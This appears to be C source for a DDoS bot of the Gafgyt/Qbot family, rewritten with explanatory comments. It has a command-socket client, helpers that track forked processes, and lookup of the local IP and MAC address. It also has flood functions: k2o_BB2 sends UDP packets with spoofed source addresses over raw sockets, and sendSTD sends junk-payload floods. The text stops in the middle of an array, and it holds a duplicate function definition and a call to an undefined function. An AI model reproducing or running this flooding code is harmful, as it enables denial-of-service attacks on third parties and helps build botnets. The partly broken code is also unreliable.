// global variables + definitions
int mainCommSock = 0; // main comm socket, init to 0
int currentServer = -1; // index of current server, init to -1
int gotIP = 0; // flag to indicate if the IP address was obtained, init to 0
uint32_t *pids; // pointer to store PIDs
uint64_t numpids = 0; // counter for the number of PIDs
struct in_addr MyIP; // struct to store my IP
#define PHI 0x9e3779b9 // constant used for RNG
static uint32_t Q[4096]; // array used for RNG
static uint32_t c = 362436; // variable used in RNG
unsigned char macAddress[6] = {0}; // MAC address, initialized to 0

/**
 * initializes network connection
 *
 * @return status code, 0 for success, non-zero for failure
 */
int initConnection() {
    // implementation depends on specific network protocols and requirements
    return 0;
}

/**
 * generates random string of a specified length
 *
 * @param buf pointer to the buffer where the random string will be stored
 * @param length length of the random string to generate
 */
void makeRandomStr(unsigned char *buf, int length) {
    // implementation: fill 'buf' with random characters of 'length'
    // ensure that the generated string is null-terminated if it's used as a C string
}


/**
 * calculates the checksum for TCP/UDP packets
 *
 * @param iph pointer to the IP header structure
 * @param buff pointer to the buffer containing the TCP/UDP packet
 * @param data_len length of the TCP/UDP data
 * @param len Length of the buffer
 * @return calculated checksum as a 16bit unsigned integer
 */
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t sum = 0;

    // add the buffer's word-wise contents to sum
    while (len > 1)
    {
        sum += *buf++;
        len -= 2;
    }

    // handle the case where the buffer's size is odd
    if (len == 1)
        sum += *((uint8_t *) buf);

    // add IP source and destination addresses to the sum
    sum += (ntohs(iph->saddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->saddr) & 0xFFFF;
    sum += (ntohs(iph->daddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->daddr) & 0xFFFF;

    // add the protocol and the TCP/UDP length
    sum += htons(iph->protocol) + data_len;

    // fold the sum to 16 bits and complement
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ~sum;
}
/**
 * init a pseudo-RNG
 *
 * @param x seed value for the generator
 */
void init_rand(uint32_t x)
{
    int i;

    // seed the first values
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    // generate pseudo-random values for the rest of the array
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

/**
 * generates a random number using the CMWC (Complementary-Multiply-With-Carry) method
 *
 * @return 32bit random number
 */
uint32_t rand_cmwc(void)
{
    const uint64_t a = 18782LL;
    static uint32_t i = 4095;
    uint64_t t;
    uint32_t x;
    static uint32_t c = 362436; // move this from global to static local

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);       // only upper 32 bits
    x = t + c;

    if (x < c) {
        x++;
        c++;
    }

    return (Q[i] = 0xfffffffe - x); // simplified r - x, where r = 0xfffffffe
}

/**
 * generates random IP address within netmask
 *
 * @param netmask netmask to use for generating IP
 * @return random IP address within the specified netmask
 */
in_addr_t findRandIP(in_addr_t netmask)
{
    in_addr_t tmp = ntohl(MyIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

/**
 * reads line from a file descriptor
 *
 * @param buffer buffer to store the line
 * @param bufferSize size of the buffer
 * @param fd file descriptor to read from
 * @return buffer on success, NULL on failure or EOF
 */
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, bytes_read;

    while (total < bufferSize - 1) {
        bytes_read = read(fd, buffer + total, 1);
        if (bytes_read != 1) // check for EOF or error
            break;

        if (buffer[total] == '\n') // check for end of line
            break;

        total++;
    }

    buffer[total] = '\0'; // null-terminate the string
    return (bytes_read == 1) ? buffer : NULL;
}
/**
 * retrieves the machine's IP address and MAC address.
 *
 * @return 0 on failure, non-zero on success.
 */
int getMyIP()
{
    // create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1)
        return 0; // socket creation failed

    // set up the destination server address (google's public DNS server)
    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8"); // google's DNS IP
    serv.sin_port = htons(53); // DNS port

    // connect the socket to the server
    int err = connect(sock, (const struct sockaddr *)&serv, sizeof(serv));
    if (err == -1)
        return 0; // connection failed

    // retrieve the local end of the connection (my IP address)
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr *)&name, &namelen);
    if (err == -1)
        return 0; // Failed to get socket name

    // store my IP address
    MyIP.s_addr = name.sin_addr.s_addr;

    // open the routing table file
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];

    // read routing table entries
    while (fdgets(linebuf, 4096, cmdline) != NULL)
    {
        // look for the default route entry
        if (strstr(linebuf, "\t00000000\t") != NULL)
        {
            // extract the interface name
            unsigned char *pos = linebuf;
            while (*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096); // clear the buffer for the next line
    }
    close(cmdline); // close the routing table file

    // if a default route was found
    if (*linebuf)
    {
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf); // set the interface name

        // get MAC address of the interface
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (int i = 0; i < 6; i++)
            macAddress[i] = ((unsigned char *)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock); // slose the socket
    return 1; // success!
}

/**
 * calculates length of string
 *
 * @param str pointer to string
 * @return length of string
 */
int util_strlen(char *str) {
    int c = 0;
    while (*str++ != 0)  // increment counter until null character is reached
        c++;
    return c;
}

/**
 * case-insensitive string search
 *
 * @param haystack string to be searched
 * @param haystack_len length of the haystack string
 * @param str substring to search for
 * @return first occurrence of str in haystack, or -1 if not found
 */
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0) {
        char a = *ptr++; // current character in haystack
        char b = str[match_count]; // current character in str
        // convert both characters to lowercase
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b) {
            if (++match_count == str_len) // complete match found
                return (ptr - haystack);
        } else {
            match_count = 0; // reset match count if characters don't match
        }
    }

    return -1; // substring not found
}

/**
 * copies memory from source to destination
 *
 * @param dst destination pointer
 * @param src source pointer
 * @param len number of bytes to copy
 */
void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

/**
 * sopies string from source to destination
 *
 * @param dst destination string pointer
 * @param src source string pointer
 * @return length of the copied string
 */
int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);
    util_memcpy(dst, src, l + 1);
    return l;
}

/**
 * 0 buffer
 *
 * @param buf pointer to the buffer
 * @param len length of the buffer
 */
void util_zero(void *buf, int len) {
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

/**
 * reads a line from a file descriptor
 *
 * @param buffer buffer to store line
 * @param buffer_size size of buffer
 * @param fd file descriptor to read from
 * @return buffer on success, NULL on failure or EOF
 */
char *util_fdgets(char *buffer, int buffer_size, int fd) {
    int got = 0, total = 0;
    do {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    } while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

/**
 * checks if a character is a digit
 *
 * @param c the character to check.
 * @return 1 if the character is a digit, 0 otherwise
 */
int util_isdigit(char c) {
    return (c >= '0' && c <= '9');
}

/**
 * checks if a character is an alphabet letter
 *
 * @param c character to check
 * @return 1 if the character is an alphabet letter, 0 otherwise
 */
int util_isalpha(char c) {
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

/**
 * checks if char is a whitespace
 *
 * @param c char to check
 * @return 1 if char is a whitespace, 0 otherwise
 */
int util_isspace(char c) {
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

/**
 * checks if char is an uppercase letter
 *
 * @param c char to check
 * @return 1 if the character is uppercase, 0 otherwise
 */
int util_isupper(char c) {
    return (c >= 'A' && c <= 'Z');
}

/**
 * converts a string to an integer
 *
 * @param str string to convert
 * @param base numerical base for conversion
 * @return converted integer value
 */
int util_atoi(char *str, int base) {
    unsigned long acc = 0;
    int c;
    unsigned long cutoff;
    int neg = 0, any, cutlim;

    // skip white space characters
    do {
        c = *str++;
    } while (util_isspace(c));

    // check for a sign
    if (c == '-') {
        neg = 1;
        c = *str++;
    } else if (c == '+') {
        c = *str++;
    }

    // calculate cutoff values to determine overflow
    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;

    // convert string to integer
    for (acc = 0, any = 0;; c = *str++) {
        if (util_isdigit(c)) {
            c -= '0';
        } else if (util_isalpha(c)) {
            c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
        } else {
            break;
        }
        
        // check for overflow
        if (c >= base) {
            break;
        }
        if (any < 0 || acc > cutoff || (acc == cutoff && c > cutlim)) {
            any = -1;
        } else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }

    // handle overflow by setting to maximum/minimum value
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg) {
        acc = -acc;
    }
    return (acc);
}

/**
 * converts an integer to a string
 *
 * @param value the integer value to convert
 * @param radix the base of the numerical representation
 * @param string buffer to store the converted string
 * @return pointer to the converted string
 */
char *util_itoa(int value, int radix, char *string) {
    if (string == NULL)
        return NULL;

    if (value != 0) {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        // handle negative numbers for base 10
        if (radix == 10 && value < 0) {
            neg = 1;
            accum = -value;
        } else {
            neg = 0;
            accum = (unsigned int)value;
        }

        // convert integer to string
        while (accum) {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        // add negative sign if needed
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        // copy result to output string
        util_strcpy(string, &scratch[offset]);
    } else {
        // handle zero case
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
/**
 * compares two strings
 *
 * @param str1 first string for comparison
 * @param str2 second string for comparison
 * @return 1 if strings are equal, 0 otherwise
 */
int util_strcmp(char *str1, char *str2) {
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    // strings are not equal if their lengths differ
    if (l1 != l2)
        return 0;

    // compare each character
    while (l1--) {
        if (*str1++ != *str2++)
            return 0; // strings are not equal
    }

    return 1; // strings are equal
}
/**
 * searches for a memory segment within a buffer
 *
 * @param buf buffer to search in
 * @param buf_len length of the buffer
 * @param mem memory segment to find
 * @param mem_len length of the memory segment
 * @return position of the segment in the buffer, -1 if not found
 */
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len) {
    int i, matched = 0;

    // return -1 if the memory segment is larger than the buffer
    if (mem_len > buf_len)
        return -1;

    // search for the memory segment
    for (i = 0; i < buf_len; i++) {
        if (buf[i] == mem[matched]) {
            if (++matched == mem_len)
                return i + 1; // segment found
        } else
            matched = 0; // reset match count
    }

    return -1; // segment not found
}
/**
 * trims leading and trailing whitespace from a string
 *
 * @param str string to be trimmed
 */
void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    // trim leading spaces
    while (isspace(str[begin])) begin++;

    // trim trailing spaces
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    // null-terminate the trimmed string
    str[i - begin] = '\0';
}
/**
 * prints a character to a string or stdout
 *
 * @param str pointer to the string or NULL for stdout
 * @param c character to print
 */
static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    } else (void)write(1, &c, 1);
}
/**
 * prints a string with optional padding
 *
 * @param out pointer to the output string or NULL for stdout
 * @param string the string to print
 * @param width width for padding
 * @param pad padding flags
 * @return number of printed characters
 */
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';

    // setup padding
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & PAD_ZERO) padchar = '0';
    }

    // print padding
    if (!(pad & PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }

    // print the string
    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }

    // print trailing padding
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }

    return pc;
}
/**
 * formats an integer and prints it to a string or stdout
 *
 * @param out pointer to the output string or NULL for stdout
 * @param i integer to format
 * @param b base for formatting the integer
 * @param sg flag indicating if the integer is signed
 * @param width width for padding
 * @param pad padding flags
 * @param letbase base character for hexadecimal representation
 * @return number of characters printed
 */
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    // handle zero value
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }

    // handle negative numbers for base 10
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    // convert integer to string
    s = print_buf + PRINT_BUF_LEN - 1;
    *s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    // handle negative sign
    if (neg) {
        if (width && (pad & PAD_ZERO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}
/**
 * formatted printing of various data types to a string or stdout
 *
 * @param out pointer to the output string or NULL for stdout
 * @param format format string
 * @param args variable arguments list
 * @return number of characters printed
 */
static int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        // handle format specifiers
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for (; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            // handle different format specifiers
            if (*format == 's') {
                register char *s = (char *)va_arg(args, int);
                pc += prints(out, s ? s : "(null)", width, pad);
                continue;
            }
            // formatting integers
            if (*format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            // formatting hexadecimal
            if (*format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            // formatting unsigned
            if (*format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            // formatting character
            if (*format == 'c') {
                scr[0] = (unsigned char)va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            // handle regular characters
out:
            printchar(out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end(args);
    return pc;
}
/**
 * sends formatted data to a socket
 *
 * @param sock socket file descriptor
 * @param formatStr format string
 * @param ... variable arguments for formatting
 * @return number of bytes sent or -1 on failure
 */
int sockprintf(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    if (textBuffer == NULL) return -1; // check for malloc failure

    memset(textBuffer, 0, 2048);
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args); // format the string
    va_end(args);
    textBuffer[strlen((char *)textBuffer)] = '\n'; // append newline
    int q = send(sock, textBuffer, strlen((char *)textBuffer), MSG_NOSIGNAL); // send data
    free(textBuffer);
    return q;
}
/**
 * converts a domain name or IP address string to an in_addr structure
 *
 * @param toGet the string to convert
 * @param i pointer to the in_addr structure to store the result
 * @return 0 on success, 1 on failure
 */
int getHost(unsigned char *toGet, struct in_addr *i) {
    if ((i->s_addr = inet_addr((char *)toGet)) == -1) return 1; // convert and check
    return 0;
}
/**
 * generates a random uppercase string
 *
 * @param buf buffer to store the random string
 * @param length length of the string to generate
 */
void makeRandomStr(unsigned char *buf, int length) {
    for (int i = 0; i < length; i++) {
        buf[i] = (rand_cmwc() % (91 - 65)) + 65; // generate random uppercase character
    }
}
/**
 * receives a line from a socket with a timeout
 *
 * @param socket socket file descriptor
 * @param buf buffer to store the received line
 * @param bufsize size of the buffer
 * @return number of characters read, -1 on failure
 */
int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);
    fd_set myset;
    struct timeval tv = {30, 0}; // 30-second timeout
    FD_ZERO(&myset);
    FD_SET(socket, &myset);

    int retryCount = 0;
    while (select(socket + 1, &myset, NULL, &myset, &tv) <= 0 && retryCount < 10) {
        retryCount++;
        tv = (struct timeval){30, 0};
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
    }

    unsigned char *cp = buf;
    int count = 0;
    while (bufsize-- > 1) {
        unsigned char tmpchr;
        if (recv(socket, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1; // error in recv
        }
        *cp++ = tmpchr;
        if (tmpchr == '\n') break; // end of line
        count++;
    }
    *cp = 0x00; // null-terminate the string
    return count;
}
/**
 * connects to a specified host and port with a timeout
 *
 * @param fd socket file descriptor
 * @param host host name or IP address to connect to
 * @param port port number to connect to
 * @param timeout timeout in seconds
 * @return 1 on success, 0 on failure or timeout
 */
int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK; // set non-blocking mode
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost((unsigned char *)host, &dest_addr.sin_addr)) return 0; // resolve host
    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));

    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv = (struct timeval){timeout, 0};
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0) {
                int valopt;
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt) return 0; // error in connect
            } else return 0; // timeout or select error
        } else return 0; // connect error
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK); // reset to blocking mode
    fcntl(fd, F_SETFL, arg);

    return 1;
}
/**
 * forks the process and keeps track of the child PIDs
 *
 * @return fork result, 0 for child process, >0 for parent process with child PID, <0 on error
 */
int listFork() {
    uint32_t parent = fork();
    if (parent <= 0) return parent; // return fork result for child or error

    numpids++;
    uint32_t *newpids = (uint32_t *)malloc((numpids + 1) * sizeof(uint32_t));
    if (newpids == NULL) return -1; // check malloc failure

    for (uint32_t i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;

    return parent; // return parent process with child PID
}
/**
 * calculates the checksum for a given buffer
 *
 * @param buf pointer to the buffer
 * @param count size of the buffer in bytes
 * @return calculated checksum
 */
unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) {
        sum += *buf++; // add buffer value to sum
        count -= 2; // decrement count by the size of short
    }
    if (count > 0) {
        sum += *(unsigned char *)buf; // handle odd byte
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16); // fold high into low
    }
    return (uint16_t)(~sum); // one's complement
}
/**
 * calculates the tcp checksum for given ip and tcp headers
 *
 * @param iph pointer to the ip header
 * @param tcph pointer to the tcp header
 * @return calculated tcp checksum
 */
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    if (tcp == NULL) return 0; // check for malloc failure

    // construct pseudo header and tcp header for checksum calculation
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));

    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}
/**
 * constructs an ip packet header
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5; // internet header length
    iph->version = 4; // ipv4
    iph->tos = 0; // type of service
    iph->tot_len = sizeof(struct iphdr) + packetSize; // total length
    iph->id = rand_cmwc(); // random id
    iph->frag_off = 0; // fragment offset
    iph->ttl = MAXTTL; // time to live
    iph->protocol = protocol; // set protocol
    iph->check = 0; // checksum set to 0 before calculation
    iph->saddr = source; // source address
    iph->daddr = dest; // destination address
}
/**
 * sends packets to a specified target
 *
 * @param target destination IP address as a string
 * @param port destination port, random if 0
 * @param timeEnd duration to send packets
 * @param spoofit spoofing level for IP addresses
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck checks when to sleep
 * @param sleeptime time to sleep in milliseconds
 */
void k2o_BB2(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    if (spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (!sockfd) return;

        unsigned char *buf = malloc(packetsize + 1);
        if (buf == NULL) return;
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;

        for (unsigned int i = 0, ii = 0; ; ) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if (i++ == pollinterval) {
                dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
                if (time(NULL) > end) break;
                i = 0;
            }
            if (ii++ == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
            }
        }
        free(buf);
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd) return;

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) return;
        srand_cmwc();

        in_addr_t netmask = spoofit == 0 ? ~((in_addr_t)-1) : ~((1 << (32 - spoofit)) - 1);
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        int end = time(NULL) + timeEnd;
        for (unsigned int i = 0, ii = 0; ; ) {
            makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(findRandIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
            udph->len = htons(sizeof(struct udphdr) + packetsize);
            udph->source = rand_cmwc();
            udph->dest = port == 0 ? rand_cmwc() : htons(port);
            udph->check = 0;
            makeRandomStr((unsigned char *)(udph + 1), packetsize);
            iph->check = csum((unsigned short *)packet, iph->tot_len);

            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if (i++ == pollinterval) {
                if (time(NULL) > end) break;
                i = 0;
            }
            if (ii++ == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
            }
        }
    }
}
/**
 * sends UDP packets to a specified IP for a given duration
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendSTD(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;

    hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    // array of predefined strings to be used in the packets
    char *randstrings[] = {
        // include the array of strings provided
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"
